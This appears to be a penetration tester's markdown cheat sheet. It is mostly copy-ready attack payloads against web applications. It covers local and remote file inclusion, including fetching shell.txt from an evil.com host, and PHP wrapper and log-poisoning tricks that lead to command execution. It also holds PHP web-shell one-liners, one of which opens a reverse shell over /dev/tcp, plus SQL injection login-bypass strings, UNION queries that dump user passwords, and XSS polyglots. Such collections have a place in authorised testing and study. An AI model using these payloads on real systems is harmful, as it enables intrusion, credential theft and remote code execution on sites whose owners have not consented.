## Basic LFI
Thanks to https://github.com/swisskyrepo/PayloadsAllTheThings

```
http://example.com/index.php?page=../../../etc/passwd
```

### Null byte

```
http://example.com/index.php?page=../../../etc/passwd%00
```

### Double encoding

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### Path and dot truncation

On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.

```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### Filter bypass tricks

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## Basic RFI

Most of the filter bypasses from LFI section can be reused for RFI.

```
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Null byte

```
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### Double encoding

```
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### Bypass allow_url_include

When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.

1. Create a share open to everyone
2. Write a PHP code inside a file : `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`


## LFI / RFI using wrappers

### Wrapper php://filter

The part "php://filter" is case insensitive

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

can be chained with a compression wrapper for large files.

```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

NOTE: Wrappers can be chained : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`


### LFI Wrapper ZIP
```
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
rm payload.php   

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

### RFI Wrapper DATA with "" payload
```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAh
```

### Wrapper expect://

```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### Wrapper input://

Specify your payload in the POST parameters

```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```

### LFI to RCE via /proc/self/environ

Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file

```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### Logfile Injection
Don't forget maybe you can connect to the server and write code into the logfiles. This may also work with emails if you can view them.
```
nc <IP> <port>
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: <IP>
Connection: close
```

Afterwards include the it via LFI:
```?lfi_file=/var/log/apache2/access.log&cmd=<command>```

Example log files to try:
```
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

### More shell examples and snippets
Evil.txt example to use with any RFI
```
<?php echo shell_exec("whoami");?>

# Or just get a reverse shell directly like this:
<?php echo system("0<&196;exec 196<>/dev/tcp/10.10.14.22/443; sh <&196 >&196 2>&196"); ?>
```
Base64 
```
<?php echo_shell_exec(base64_decode($_GET["bang"])); ?>
```
Other ways to make a shell
```
<?php $cmd=$_GET['cmd']; system("$cmd"); ?>
<?php echo shell_exec($_GET['cmd']);?>
```
If you use REQUEST, you can use the GET and POST parameter:
```
<?php $cmd=$_REQUEST['cmd']; system("$cmd"); ?>
```
```
curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.56.103/test/1.php
<pre><?php system($_GET['c']); die(); ?></pre>
<pre><?php system($_GET['c']) ?></pre>
<?php echo system($_REQUEST['cmd']); ?> 
```


A good overview of all this https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

list of possible Apache directories: http://wiki.apache.org/httpd/DistrosDefaultLayout

include access log from file descriptor /proc/self/fd/XX: http://pastebin.com/raw.php?i=cRYvK4jb

include email log files: http://devels-playground.blogspot.de/2007/08/local-file-inclusion-tricks.html

include session files: https://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/

include PHP’s temporarily uploaded files http://gynvael.coldwind.pl/?id=376


## MySQL stuff

### Classic authentication bypass strings
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
'-- -
'-- -#
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```
### SQLi
Check if you can find a row, where you can place your output
```http://ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8```

Get the version of the database
```http://ip/inj.php?id=1 union all select 1,2,3,@@version,5```

Get the current user
```http://ip/inj.php?id=1 union all select 1,2,3,user(),5```

See all tables
```http://ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables```

Get column names for a specified table
```http://ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'```

Concat user names and passwords (0x3a represents “:”)
```http://ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users```

Write into a file
```http://ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'```


## XSS Polyglots

Polyglot XSS - 0xsobky

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Polyglot XSS - Ashar Javed

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

Polyglot XSS - Mathias Karlsson

```javascript
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

Polyglot XSS - Rsnake

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

Polyglot XSS - Daniel Miessler

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
```

Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)

```javascript
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```

![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)

```javascript
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```

Polyglot XSS - from [@filedescriptor's Polyglot Challenge](http://polyglot.innerht.ml)

```javascript
# by crlf
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

# by europa
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

# by EdOverflow
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

# by h1/ragnar
javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
```

Reading:

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

https://www.exploit-db.com/papers/13646/ (This is an awesome paper)

http://brutelogic.com.br/blog/probing-to-find-xss/

